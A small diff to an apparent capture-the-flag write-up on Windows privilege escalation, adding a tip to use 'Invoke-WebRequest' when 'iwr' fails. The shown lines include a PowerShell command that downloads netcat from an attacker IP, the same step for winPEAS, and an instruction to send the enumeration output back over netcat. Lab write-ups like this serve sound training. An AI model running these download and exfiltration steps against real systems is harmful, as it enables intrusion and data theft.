@@ -84,8 +84,11 @@ d0xxxxxxxxxxxxxxxxxxxxxx73
 
 User flag down, now we need to privesc to get the root.txt flag.
 
-use `powershell iwr -uri http://10.10.14.19/nc.exe -outfile .\nc.exe`
+Use `powershell iwr -uri http://10.10.14.19/nc.exe -outfile .\nc.exe`
 do the same for winPEAS.bat
+
+Sometimes "iwr" won't work, and you'll have to type out the long version 'Invoke-WebRequest'.
+
 
 run `winPEAS.bat > enum.txt` then send enum.txt via nc.
 
